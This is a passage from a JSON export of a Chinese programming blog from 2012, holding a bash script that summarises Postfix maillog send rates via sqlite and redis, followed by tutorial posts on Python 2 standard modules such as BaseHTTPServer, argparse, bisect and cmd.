设置帧率，即每秒抓取的画面数。</p>\n\n<p>-i :0.0 设置输入源，本地X默认在0.0</p>\n\n<p>-sameq 保持跟输入流一样的图像质量，以用来后期处理</p>\n\n<p><strong>4 最近的一个脚本，分析postfix的maillog的一些东西，其中使用了sqlite和redis的bash接口,并且格式化数据发送邮件</strong></p>\n\n<p>主要是：分析前一天的maillog，按小时，分析出那个小时里面给某邮件ISP发送的邮件的数量频率（单位封/min，第一封到最后一封，是按分钟，</p>\n\n<p>、不是按照每小时60min），计算全天给某邮件ISP的发送频率（同上，不是一天的24*60min）,计算每天给各邮件ISP发送总量，整天拒绝和弹回的邮件总量</p>\n\n<p><strong><pre class=\"sh_bash\"></strong>\n#!/bin/bash</p>\n\n<p>START=`date +%s`\nfunction total(){\nfor i in qq.comnum foxmail.comnum 163.comnum 126.comnum netease.comnum sina.comnum sina.com.cnnum sohu.comnum gmail.comnum yahoo.comnum yahoo.com.cnnum live.comnum hotmail.comnum mail.alipay.comnum other reject bounced\ndo\nredis-bash-cli -h localhost set $i 0 2&gt;&amp;1 &gt;/dev/null\ndone\nfor i in qq.comint foxmail.comint 163.comint 126.comint netease.comint sina.comint sina.com.cnint sohu.comint gmail.comint yahoo.comint yahoo.com.cnint live.comint hotmail.comint mail.alipay.comint\ndo\nredis-bash-cli -h localhost set $i 0 2&gt;&amp;1 &gt;/dev/null\ndone\n}\nfunction initmail(){\nfor i in qq.com foxmail.com 163.com 126.com netease.com sina.com sina.com.cn sohu.com gmail.com yahoo.com yahoo.com.cn live.com hotmail.com mail.alipay.com\ndo\nredis-bash-cli -h localhost set $i 0 2&gt;&amp;1 &gt;/dev/null\ndone\n}\nfunction init(){\nfor i in 0{0..9} {10..24}; do sqlite3 test.db \"CREATE TABLE IF NOT EXISTS t`date -d last-day +%m%d`$i(Name VARCHAR(40),Start INTEGER,End INTEGER,Num INTEGER)\"; done\nsqlite3 test.db \"CREATE TABLE IF NOT EXISTS t`date -d last-day +%m%d`(Name VARCHAR(40),DaySum VARCHAR(40),HourHigh VARCHAR(40),DayAv VARCHAR(40))\";\ninitmail\n}\nfunction status(){\nstatus=`echo $@|grep -Po \"status=(\\w+)\"|cut -d '=' -f2`\nif [ \"$status\" = \"sent\" ];then\nparse $@\nelif [ \"$status\" = \"bounced\" ];then\nbou=`redis-bash-cli -h localhost get bounced`\n((bou++))\nredis-bash-cli -h localhost set bounced $bou 2&gt;&amp;1 &gt;/dev/null\nelse\nif [ \"`echo $@|grep reject`\" != \"\" ];then\nrej=`redis-bash-cli -h localhost get reject`\n((rej++))\nredis-bash-cli -h localhost set reject $rej 2&gt;&amp;1 &gt;/dev/null\nfi\nfi\n}\nfunction add(){\ndata=`redis-bash-cli -h localhost get $1 `\nmint=`redis-bash-cli -h localhost get $1int`\nmtotal=`redis-bash-cli -h localhost get $1num`\nif [ \"$data\" = 0 ];then\nm=`echo $@|awk '{print $4}'`\nmstart=`echo $m|cut -d ':' -f2`\nhour=`echo $m|cut -d ':' -f1`\nsqlite3 test.db \"insert into t`date -d last-day +%m%d`$c (Name,Start) values ('$1','$mstart');\"\nfi\nif [ \"$mint\" = 0 ];then\ncur=`echo \"$hour * 60 + $mstart\"|bc`\nredis-bash-cli -h localhost set $1int $cur 2&gt;&amp;1 &gt;/dev/null\nfi\n((data++))\n((mtotal++))\nredis-bash-cli -h localhost set $1 $data 2&gt;&amp;1 &gt;/dev/null\nredis-bash-cli -h localhost set $1num $mtotal 2&gt;&amp;1 &gt;/dev/null\n}\nfunction parse(){\ndata=`echo $@|grep -Po 'to=&lt;(.*@.*?)&gt;'|cut -d',' -f 1|cut -d'@' -f2`\nlen=`expr length $data`\nmail=${data:0:$len-1}\nif [ \"$mail\" = \"foxmail.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"163.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"qq.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"mail.alipay.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"126.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"netease.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"sina.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"sina.com.cn\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"sohu.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"gmail.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"yahoo.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"yahoo.com.cn\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"live.com\" ];then\nadd $mail $@\nelif [ \"$mail\" = \"hotmail.com\" ];then\nadd $mail $@\nelse\nmother=`redis-bash-cli -h localhost get other`\n((mother++))\nredis-bash-cli -h localhost set other $mother 2&gt;&amp;1 &gt;/dev/null\nfi\n}\nfunction day(){\nday=`date -d last-day +%d`\ngrep 'to=' /var/log/maillog|awk '$2=='\"$day\"' {print}'&gt;txt\n}\nfunction cal(){\nfor c in 0{0..9} {10..24}\ndo\nfor i in qq.com foxmail.com 163.com 126.com netease.com sina.com sina.com.cn sohu.com gmail.com yahoo.com yahoo.com.cn live.com hotmail.com mail.alipay.com\ndo\ntt=`redis-bash-cli -h localhost get $i`\ntable=t`date -d last-day +%m%d`$c\ndata=`sqlite3 test.db \"select * from '\"$table\"' where Name='$i';\"`\nif [ \"$data\" != \"\" ];then\nst=`echo $data|cut -d'|' -f2`\ned=`echo $data|cut -d'|' -f3`\nnu=`echo $data|cut -d'|' -f4`\ncur=`expr $ed - $st`\nif [ \"$cur\" != 0 ];then\nd=`echo \"scale=2;$nu/$cur\"|bc`\nif [ `echo \"$d &gt; $tt\"|bc` -eq 1 ];then\nredis-bash-cli -h localhost set $i $d 2&gt;&amp;1 &gt;/dev/null\nfi\nfi\nfi\ndone\ndone\n}\nsqlop(){\nfor i in qq.com foxmail.com 163.com 126.com netease.com sina.com sina.com.cn sohu.com gmail.com yahoo.com yahoo.com.cn live.com hotmail.com mail.alipay.com\ndo\nnum=`redis-bash-cli -h localhost get $i'num'`\nhi=`redis-bash-cli -h localhost get $i`\ndi=`redis-bash-cli -h localhost get $i'int'`\nsqlite3 test.db \"insert into t`date -d last-day +%m%d` (Name,DaySum,HourHigh,DayAv) values ('$i','$num','$hi','$di');\"\ndone\n}\nfunction caltotal(){\nfor i in qq.com foxmail.com 163.com 126.com netease.com sina.com sina.com.cn sohu.com gmail.com yahoo.com yahoo.com.cn live.com hotmail.com mail.alipay.com\ndo\nend=`grep 'to=&lt;.*@'\"$i\"'&gt;' txt|tail -n 1|awk '{print $3}'`\nmstart=`echo $end|cut -d ':' -f2`\nhour=`echo $end|cut -d ':' -f1`\ncur=`echo \"$hour * 60 + $mstart\"|bc`\nstd=`redis-bash-cli -h localhost get $i'int'`\nsum=`redis-bash-cli -h localhost get $i'num'`\nif [ \"$sum\" != 0 ];then\nd=`expr $cur - $std`\nda=`echo \"scale=2;$sum/$d\"|bc`\nelse\nda=0\nfi\nredis-bash-cli -h localhost set $i'int' $da  2&gt;&amp;1 &gt; /dev/null\ndone\n}\nfunction sendmail()\n{\nEND=`date +%s`\notime=`date -d last-day +%d`\ns=`expr \\( $END - $START \\)`\necho -n \"&lt;strong&gt;您好：&lt;/br&gt;&lt;/strong&gt;\" &gt; Mail\necho -n \"&lt;strong&gt;&lt;br&gt;$otime日邮件服务器数据统计&lt;/br&gt;&lt;/strong&gt;\" &gt;&gt; Mail\necho -n \"&lt;table&gt;&lt;TR&gt;&lt;TD&gt;邮件ISP&lt;/TD&gt;&lt;TD&gt;本日发送总量(单位:封)&lt;/TD&gt;&lt;TD&gt;本日发送最高一小时频率（单位:封/min)&lt;/TD&gt;&lt;TD&gt;本日平均(单位:封/min)&lt;/TD&gt;&lt;/TR&gt;\" &gt;&gt; Mail\nsqlite3 -html test.db  \"select Name,DaySum,HourHigh,DayAv from t`date -d last-day +%m%d`;\" &gt;&gt; Mail\nbou=`redis-bash-cli -h localhost get bounced`\necho -n \"&lt;TR&gt;&lt;TD&gt;被弹出邮件数量&lt;/TD&gt;&lt;TD&gt;$bou&lt;/TD&gt;&lt;/TR&gt;\" &gt;&gt; Mail\nrej=`redis-bash-cli -h localhost get reject`\necho -n \"&lt;TR&gt;&lt;TD&gt;被拒绝邮件数量&lt;/TD&gt;&lt;TD&gt;$rej&lt;/TD&gt;&lt;/TR&gt;\" &gt;&gt; Mail\noth=`redis-bash-cli -h localhost get other`\necho -n \"&lt;TR&gt;&lt;TD&gt;其它类型邮件数量&lt;/TD&gt;&lt;TD&gt;$oth&lt;/TD&gt;&lt;/TR&gt;&lt;/table&gt;\" &gt;&gt; Mail\necho -n \"&lt;font color=\"red\"&gt;&lt;TR&gt;本次操作花费: $s秒&lt;/TR&gt;&lt;/font&gt;\" &gt;&gt; Mail\n#cat Mail | /usr/bin/formail -I \"From: dongwm@dongwm.com\" -I \"MIME-Version:1.0\" -I \"Content-type:text/html;charset=utf-8\" -I \"Subject:Postfix昨日邮件系统统计结果\" -I \"To: dongwm2@dongwm.com\"|/usr/sbin/sendmail -oi dongwm2@dongwm.com\n}\nfunction tm(){\nfor c in 0{0..9} {10..24}\ndo\nawk '/'\"$c\"':[0-5][0-9]:[0-5][0-9]/ {print}' txt|while read line; do status $line; done\nfor i in qq.com foxmail.com 163.com 126.com netease.com sina.com sina.com.cn sohu.com gmail.com yahoo.com yahoo.com.cn live.com hotmail.com mail.alipay.com\ndo\ndata=`redis-bash-cli -h localhost get $i`\nend=`awk '/'\"$c\"':[0-5][0-9]:[0-5][0-9]/ {print}' txt|grep 'to=&lt;.*@'\"$i\"'&gt;'|tail -n 1|awk '{print $3}'|cut -d ':' -f2`\nsqlite3 test.db \"update t`date -d last-day +%m%d`$c set Num='$data',End='$end' where Name='$i';\"\ndone\nsleep 5\ninitmail\ndone\n}\nfunction end(){\nfor i in 0{0..9} {10..24}; do sqlite3 test.db \"drop table if exists t`date -d last-day +%m%d`$i\"; done\nsqlite3 test.db \"drop table if exists t`date -d last-day +%m%d`\";\n}\n#主函数\nend\ntotal\n#day\ninit\ntm\ncal\ncaltotal\nsqlop\nsendmail\n<strong></pre>\n</strong></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "05"
    }
  },
  {
    "id": 153,
    "title": "关于BaseHTTPServer研究",
    "category": "python模块研究",
    "tags": [
      "BaseHTTPRequestHandler",
      "BaseHTTPServer",
      "HTTPServer"
    ],
    "url": "/archives/guanyu/",
    "content": "<p>前言：BaseHTTPServer是一个实现web server的基类</p>\n\n<p>例子1 http get方法：</p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import BaseHTTPRequestHandler  #BaseHTTPRequestHandler类细分到处理每个协议的方法，这里是‘GET’方法的例子\nimport urlparse</p>\n\n<p>class GetHandler(BaseHTTPRequestHandler):\n    def do_GET(self):   #重写这个方法\n        parsed_path = urlparse.urlparse(self.path)\n        message_parts = [  #建立一个想要返回的列表\n                'CLIENT VALUES:',    #客户端信息\n                'client_address=%s (%s)' % (self.client_address,\n                                            self.address_string()),  #返回客户端的地址和端口\n                'command=%s' % self.command,  #返回操作的命令，这里比然是'get'\n                'path=%s' % self.path,  #返回请求的路径\n                'real path=%s' % parsed_path.path, #返回通过urlparse格式化的路径\n                'query=%s' % parsed_path.query, #返回urlparse格式化的查询语句的键值\n                'request_version=%s' % self.request_version, #返回请求的http协议版本号\n                '',\n                'SERVER VALUES:', #服务器段信息\n                'server_version=%s' % self.server_version, #返回服务器端http的信息\n                'sys_version=%s' % self.sys_version, #返回服务器端使用的python版本\n                'protocol_version=%s' % self.protocol_version,  #返回服务器端使用的http协议版本\n                '',\n                'HEADERS RECEIVED:',\n                ]\n        for name, value in sorted(self.headers.items()):  #返回項添加头信息，包含用户的user-agent信息，主机信息等\n            message_parts.append('%s=%s' % (name, value.rstrip()))\n        message_parts.append('')\n        message = '\\r\\n'.join(message_parts)\n        self.send_response(200)  #返回给客户端结果，这里的响应码是200 OK，并包含一些其他信息\n        self.end_headers() #结束头信息\n        self.wfile.write(message) #返回数据\n        return\nif __name__ == '__main__':\n    from BaseHTTPServer import HTTPServer\n    server = HTTPServer(('localhost', 8080), GetHandler)  #在本地8080端口上启用httpserver，使用自定义的GetHandler处理\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()  #保存程序一直运行\n</pre></p>\n\n<p>客户端测试（linux的curl即可）</p>\n\n<p>dongwm@linux-dongwm:~&gt; curl -i http://localhost:8080/?arg=value\nHTTP/1.0 200 OK\nServer: BaseHTTP/0.3 Python/2.7\nDate: Mon, 11 Jun 2012 06:59:20 GMT</p>\n\n<p>CLIENT VALUES:\nclient_address=('127.0.0.1', 54016) (localhost)\ncommand=GET\npath=/?arg=value\nreal path=/\nquery=arg=value\nrequest_version=HTTP/1.1</p>\n\n<p>SERVER VALUES:\nserver_version=BaseHTTP/0.3\nsys_version=Python/2.7\nprotocol_version=HTTP/1.0</p>\n\n<p>HEADERS RECEIVED:\naccept=*/*\nhost=localhost:8080\nuser-agent=curl/7.21.2 (i686-pc-linux-gnu) libcurl/7.21.2 OpenSSL/1.0.0c zlib/1.2.5 libidn/1.15 libssh2/1.2.7</p>\n\n<p>例子2 http post方法：</p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import BaseHTTPRequestHandler\nimport cgi   #cgi模块，让使用者通过Web服务器来执 行Web程序，并将所执行的结果通过Web服务器返回给浏览器，它产生HTML数据</p>\n\n<p>class PostHandler(BaseHTTPRequestHandler):\n    def do_POST(self): #还是重写这个方法\n        form = cgi.FieldStorage(  #cgi.FieldStorage实例效果类似一个字典，包含键－值和len等内置函数\n            fp=self.rfile,\n            headers=self.headers,\n            environ={'REQUEST_METHOD':'POST',\n                     'CONTENT_TYPE':self.headers['Content-Type'],\n                     })\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write('Client: %s\\n' % str(self.client_address))\n        self.wfile.write('User-agent: %s\\n' % str(self.headers['user-agent']))\n        self.wfile.write('Path: %s\\n' % self.path)\n        self.wfile.write('Form data:\\n')</p>\n\n<p>        for field in form.keys():\n            field_item = form[field]\n            self.wfile.write('\\t%s=%s\\n' % (field, form[field].value))\n        return</p>\n\n<p>if __name__ == '__main__':\n    from BaseHTTPServer import HTTPServer\n    server = HTTPServer(('localhost', 8080), PostHandler)\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()\n</pre></p>\n\n<p>客户端测试（linux的curl）</p>\n\n<p>dongwm@linux-dongwm:~&gt; curl http://localhost:8080/ -F name=dongwm -F site=www.dongwm.com\nClient: ('127.0.0.1', 44314)\nUser-agent: curl/7.21.2 (i686-pc-linux-gnu) libcurl/7.21.2 OpenSSL/1.0.0c zlib/1.2.5 libidn/1.15 libssh2/1.2.7\nPath: /\nForm data:\nname=dongwm\nsite=www.dongwm.com\n例子3 使用多线程</p>\n\n<p>注：<tt></tt><tt>HTTPServer</tt>是SocketServer.TCPServer的一个简单的子类，不能使用多个线程或进程来处理请求，可以这样使用</p>\n\n<p><pre class=\"sh_python\">\nfrom BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler\nfrom SocketServer import ThreadingMixIn\nimport threading</p>\n\n<p>class Handler(BaseHTTPRequestHandler):</p>\n\n<p>    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        message =  threading.currentThread().getName()  #换取当前线程的名字\n        self.wfile.write(message)  #返回这个名字\n        self.wfile.write('\\n')\n        return</p>\n\n<p>class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):\n    \"\"\"Handle requests in a separate thread.\"\"\"</p>\n\n<p>if __name__ == '__main__':\n    server = ThreadedHTTPServer(('localhost', 8080), Handler)\n    print 'Starting server, use &lt;Ctrl-C&gt; to stop'\n    server.serve_forever()\n</pre></p>\n\n<p>客户端测试：</p>\n\n<p>dongwm@linux-dongwm:~&gt; curl http://localhost:8080/\nThread-1\ndongwm@linux-dongwm:~&gt; curl http://localhost:8080/\nThread-2\ndongwm@linux-dongwm:~&gt; curl http://localhost:8080/\nThread-3\ndongwm@linux-dongwm:~&gt; curl http://localhost:8080/\nThread-4</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 154,
    "title": "关于anydbm研究",
    "category": "python模块研究",
    "tags": [
      "anydbm",
      "whichdb"
    ],
    "url": "/archives/guanyuanydbmyanjiu/",
    "content": "<p>前言：DBM数据库和SQL不同，它只是简单的key－value关系</p>\n\n<p>anydbm表示一个通用的接入－DBM数据库的接口，包括<tt>dbhash</tt> (依赖<tt>bsddb</tt>), <tt>gdbm</tt>, or <tt>dbm</tt>，在python3中以及重命名为dbm模块</p>\n\n<p>以下是一个例子：</p>\n\n<p><pre class=\"sh_python\">\nimport anydbm\nimport whichdb    #确定dbm数据库文件的类型</p>\n\n<p>db = anydbm.open('/tmp/example.db', 'n')   #不存在的话创建用'c'，一直创建用'n'\ndb['key'] = 'value' \ndb['author'] = 'dongweiming'\ndb.close()</p>\n\n<p>print whichdb.whichdb('/tmp/example.db')</p>\n\n<p>db = anydbm.open('/tmp/example.db', 'r')\ntry:\n    print 'keys():', db.keys()\n    for k, v in db.iteritems():\n        print 'iterating:', k, v\n    print 'db[\"author\"] =', db['author']\nfinally:\n    db.close()</p>\n\n<p>db = anydbm.open('/tmp/example.db', 'w')\ntry:\n    db['one'] = 1\nexcept TypeError, err:    #异常处理\n    print '%s: %s' % (err.__class__.__name__, err)\nfinally:\n    db.close()\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 155,
    "title": "关于argparse研究",
    "category": "python模块研究",
    "tags": [
      "argparse"
    ],
    "url": "/archives/guanyuargparseyanjiu/",
    "content": "<p>前言：argparse模块存在于python2.7和以上版本，它<span>用来解析命令行参数</span>，用来更换<a title=\"optparse: Command line option parser to replace :mod:`getopt`.\" href=\"http://www.doughellmann.com/PyMOTW/optparse/index.html#module-optparse\"><tt>optparse</tt></a>模块。</p>\n\n<p>以下是一些例子：</p>\n\n<p><pre class=\"sh_python\">\nimport argparse\nparser = argparse.ArgumentParser(prog='PROG',   #设置一个分析器，prog默认是sys.argv[0],这里修改成PRDG 这四个字母表示\n                    description='Process some integers.',  #打印help时候 描述信息\n                    epilog=\"Just a text.\",  #再执行完后的打印信息\n                    formatter_class=argparse.ArgumentDefaultsHelpFormatter,#修改默认格式，把每个默认值都打印出来，还可以用<tt>RawDescriptionHelpFormatter</tt>和<tt>RawTextHelpFormatter</tt>\n                    conflict_handler='resolve', #假如不设置这个，不能使用相同参数，比如一个叫'-foo',还有一个叫做'-foo'，那么这样可以都用：'-foo xx -foo newxx'\n                    usage='%(prog)s [options]', #默认是列出所有参数，每个参数用列表列出来，这里修改成 只列出来[options]\n                     ) \nparser.add_argument('ng','--noarg', action=\"store_true\", default=False,help='noarg')#help打印信息‘noarg’，action指定布尔值默认是false，可以用'-ng'和'--noatg'，\nparser.add_argument('--witharg', action=\"store\", dest=\"witharg\",nargs=2,required=True,metavar=('y','z'))  #action指定参数值可以存储成任何类型,narg表示参数是2个，并且这个是必须的参数\n                                                                                                 #打印信息时会提示这2个参数的一个参考值'y'和'z'\nparser.add_argument('--witharg2', action=\"store\", dest=\"witharg2\", type=int,choices=[1,2])  #action指定成int类型,可选值是1和2，在help时候会用{}打印出来\nparser.add_argument('-c', action='store_const', dest='constant_value', #假如指定'-c'，那么value＝value-to-store，并且设定一个自定义的属性名字constant_value\n                    const='value-to-store',\n                    help='Store a constant value')\nparser.add_argument('-a', action='append', dest='collection', #如果参数重复，参数值的列表叠加，比如'-a 1 -a 2'，那么值就是[1,2]\n                    default=[],\n                    help='Add repeated values to a list',\n                    )\nparser.add_argument('-A', action='append_const', dest='const_collection',  #包含这个'-A',那么值就是['value-1-to-append']\n                    const='value-1-to-append',\n                    default=[],\n                    help='Add different values to list')\nparser.add_argument('--version', action='version', version='%(prog)s 1.0') # 使用'--version' 那么输出：PROG 1.0\nresults = parser.parse_args()\n</pre></p>\n\n<p>其他更多使用例子请参看：http://docs.python.org/library/argparse.html</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 156,
    "title": "关于atexit研究",
    "category": "python模块研究",
    "tags": [
      "atexit"
    ],
    "url": "/archives/guanyuatexityanjiu/",
    "content": "<p>前言：atexit是一个用于一个执行某程序后触发的，执行一个方法的模块，当正常执行后会调用这个回调函数。</p>\n\n<p>下面是一个例子，因为一场退出不触发这个方法：</p>\n\n<p><pre class=\"sh_python\">\nimport atexit\nimport os</p>\n\n<p>def not_called():  #这个就是想触发的方法\n    print 'This should not be called'  </p>\n\n<p>print 'Registering'\natexit.register(not_called)  #注册这个方法\nprint 'Registered'</p>\n\n<p>print 'Exiting...'\nos._exit(0)\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python !$\npython test.py\nRegistering\nRegistered\nExiting...\n而且atexit还支持装饰器用法:</p>\n\n<p><pre class=\"sh_python\">\nimport atexit\nimport os\nprint 'Registering'\n@atexit.register\ndef not_called():\n    print 'This should be called'\nprint 'Registered'\n</pre></p>\n\n<p>执行结果是：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nRegistering\nRegistered\nThis should be called</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 157,
    "title": "关于base64研究",
    "category": "python模块研究",
    "tags": [
      "base64"
    ],
    "url": "/archives/guanyubase64yanjiu/",
    "content": "<p>前言：这事一个很常用的模块，主要用来将二进制数据编码成ASCII字符。其实base64，base32和base16就是把8位字节值转化成可用的每字节6，5，4位的数据，容许非ascii字节编码为ascii字符，比如stmp协议数据</p>\n\n<p>一个简单的例子：</p>\n\n<p><pre class=\"sh_python\">\nimport base64\noriginal_string = 'This is the data, in the clear.'\nprint 'Original:', original_string   #原文\nencoded_string = base64.b64encode(original_string)\nprint 'Encoded :', encoded_string  #编码后的数据\ndecoded_string = base64.b64decode(encoded_string)\nprint 'Decoded :', decoded_string  #将编码后数据解码\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 158,
    "title": "关于bisect研究",
    "category": "python模块研究",
    "tags": [
      "bisect"
    ],
    "url": "/archives/guanyubisectyanjiu/",
    "content": "<p>前言：bisect模块会让列表保持排序顺序列出,可以在向一个数组插入数据的同时进行排序</p>\n\n<p>例子：</p>\n\n<p><pre class=\"sh_python\">\nimport bisect\nl = [ 20, 34, 35, 65, 78 ]\nprint bisect.bisect(l, 25) #显示在什么位置插入25\nbisect.insort(l,25)  #插入数据\nprint l  #新列表\nprint bisect.bisect_left(l,35) #如果待查找元素在列表中存在，则返回左侧插入位置\nprint bisect.bisect_right(l,35) #如果待查找元素在列表中存在，则返回右侧插入位置\n</pre></p>\n\n<p>结果：</p>\n\n<p>1\n[20, 25, 34, 35, 65, 78]\n3\n4</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 159,
    "title": "关于cmd研究",
    "category": "linux基础",
    "tags": [
      "cmd"
    ],
    "url": "/archives/guanyubz2yanjiu/",
    "content": "<p>前言：cmd模块创建面向行的命令处理器</p>\n\n<p><strong>1 例子：</strong></p>\n\n<p><pre class=\"sh_python\">\nimport cmd</p>\n\n<p>class HelloWorld(cmd.Cmd):\n    def do_exhello(self, line):  #设置一个命令，其中，这个命令就是‘do_’后面的字符串，这里，这个命令就是exhello\n        print \"hello\"</p>\n\n<p>    def do_EOF(self, line):  #设置一个结束方法，这里返回true表示程序退出\n        return True\nif __name__ == '__main__':\n    HelloWorld().cmdloop()\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py  #启动程序\n(Cmd) help   #进入cmd模式，输入‘help’\nUndocumented commands:\n======================\nEOF  exhello  help  #显示目前有三个命令可用</p>\n\n<p>(Cmd) exhello  #执行我们自定义的命令\nhello  #执行这个命令的方法\n(Cmd) testcmd  #不存在这个命令，报错\n*** Unknown syntax: testcmd\n(Cmd) dongwm@linux-dongwm:~&gt; #退出</p>\n\n<p><strong>2 例子（命令带参数）：</strong></p>\n\n<p><pre class=\"sh_python\">\nimport cmd\nclass HelloWorld(cmd.Cmd):\n    def do_exhello(self, person):\n        \"\"\"exhello [person]   #这个方法注释就是显示这个命令帮助的信息\n        Greet the named person\"\"\"\n        if person:\n            print \"hi,\", person\n        else:\n            print 'hi'\n    def do_EOF(self, line):\n        return True\nif __name__ == '__main__':\n    HelloWorld().cmdloop()\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(Cmd) help</p>\n\n<p>Documented commands (type help &lt;topic&gt;):\n========================================\nexhello</p>\n\n<p>Undocumented commands:\n======================\nEOF  help</p>\n\n<p>(Cmd) help exhello   #显示命令的帮助\nexhello [person]\nGreet the named person\n(Cmd) exhello dongwm\nhi, dongwm\n(Cmd) exhello\nhi\n<strong>注：上面的例子，也可以不实用方法的注释作为帮助信息，可以定义一个方法名字是：'help_' + 这个命令</strong></p>\n\n<p><pre class=\"sh_python\">\nclass HelloWorld(cmd.Cmd):\n    def do_exhello(self, person):\n        if person:\n            print \"hi,\", person\n        else:\n            print 'hi'\n    def help_exhello(self):  #注意这个方法\n        print '\\n'.join([ 'greet [person]',\n                           'Greet the named person',])\n    def do_EOF(self, line):\n        return True\nif __name__ == '__main__':\n    HelloWorld().cmdloop()\n</pre></p>\n\n<p><strong>3 实现命令的tab自动补全，其实还是给命令添加一个方法：'complete_' + 命令名字</strong></p>\n\n<p><pre class=\"sh_python\">\nimport cmd\nclass HelloWorld(cmd.Cmd):\n    FRIENDS = [ 'ailll', 'dongwm' ]  #设置一个命令提示的数据范围，这里有这2个字符串\n    def do_exhello(self, person):\n        if person:\n            print \"hi,\", person\n        else:\n            print 'hi'\n    def complete_exhello(self, text, line, begidx, endidx):  #自动补全的方法\n        if not text:  #当没有设置时候 打印所有可选的字符串\n            completions = self.FRIENDS[:]\n        else:  \n            completions = [ f\n                            for f in self.FRIENDS\n                            if f.startswith(text)\n                            ]  #假如输入的字母符合那个提供的字符串列表中的某项开头，打印之\n        return completions\n    def do_EOF(self, line):\n        return True\nif __name__ == '__main__':\n    HelloWorld().cmdloop()\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(Cmd) &lt;tab&gt;&lt;tab&gt; #2下‘tab’自动输出全部命令\nEOF      exhello  help\n(Cmd) exhello dongwm #在输入ex，按&lt;tab&gt;自动补全exhello ，然后空格，输入字母'd'，因为符合列表中的'dongwm'，自动补全\nhi, dongwm\n(Cmd)\n<strong>4 通过属性配置CMD</strong></p>\n\n<p><pre class=\"sh_python\">\nimport cmd\nclass HelloWorld(cmd.Cmd):\n    prompt = 'prompt: '   #设置最开始的提示符\n    intro = \"Simple command processor example.\"  #一个欢迎的旗标，执行cmd后自动打印出来\n    doc_header = 'doc_header'\n    misc_header = 'misc_header'\n    undoc_header = 'undoc_header'\n    ruler = '-'\n    def do_prompt(self, line):\n        \"Change the interactive prompt\"  #当执行prompt这个命令，修改提示符\n        self.prompt = line + ': '</p>\n\n<p>    def do_EOF(self, line):\n        return True\nif __name__ == '__main__':\n    HelloWorld().cmdloop()\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nSimple command processor example.  #一开始打印旗标\nprompt: prompt test #使用prompt命令修改标识\ntest: help  #表示变成'test:' 执行help命令\ndoc_header\n----------\nprompt\nundoc_header\n------------\nEOF  help\ntest:</p>\n\n<p><strong>5类似于shell的历史记录，比如使用? !</strong></p>\n\n<p>注：'?'相当于内置的help，'!'相当于象以前一样使用这个命令</p>\n\n<p><pre class=\"sh_python\">\nimport cmd\nimport os</p>\n\n<p>class ShellEnabled(cmd.Cmd):\n    last_output = ''\n    def do_shell(self, line):\n        print \"running shell command:\", line\n        output = os.popen(line).read()  #相当与启动一个新shell操作\n        print output\n        self.last_output = output\n    def do_echo(self, line):\n        \"Print the input, replacing '$out' with the output of the last shell command\"\n        print line.replace('$out', self.last_output)\n    def do_EOF(self, line):\n        return True\nif __name__ == '__main__':\n    ShellEnabled().cmdloop()\n</pre></p>\n\n<p>执行过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n(Cmd) ?</p>\n\n<p>Documented commands (type help &lt;topic&gt;):\n========================================\necho  #因为这个命令指定了方法的描述</p>\n\n<p>Undocumented commands:\n======================\nEOF  help  shell</p>\n\n<p>(Cmd) ?echo  #因为以前没有用过命令，还不存在\nPrint the input, replacing '$out' with the output of the last shell command\n(Cmd) shell pwd  #执行shell  打印当前目录\nrunning shell command: pwd\n/home/dongwm</p>\n\n<p>(Cmd) !pwd  #执行上一个命令shell，还是打印当前目录\nrunning shell command: pwd\n/home/dongwm</p>\n\n<p>(Cmd) echo $out  #现在$out存在了\n/home/dongwm</p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "11"
    }
  },
  {
    "id": 160,
    "title": "关于compileall研究",
    "category": "python模块研究",
    "tags": [
      "compileall"
    ],
    "url": "/archives/guanyucompileallyanjiu/",
